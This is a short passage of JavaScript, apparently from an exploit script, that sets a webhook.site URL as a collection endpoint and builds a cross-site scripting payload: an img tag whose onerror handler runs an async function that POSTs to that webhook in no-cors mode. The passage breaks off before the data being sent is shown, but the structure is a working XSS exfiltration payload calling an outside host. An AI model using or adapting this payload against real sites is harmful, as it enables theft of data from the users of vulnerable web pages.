                "https://webhook.site/ce3ad957-cf4e-4cca-a5c8-f4478f521d28";
            const payload = `<img src=x onerror="
              (async function() {
                var WEBHOOK = '${WEBHOOK}';
                
                await fetch(WEBHOOK, {
                  method: 'POST',
                  mode: 'no-cors',
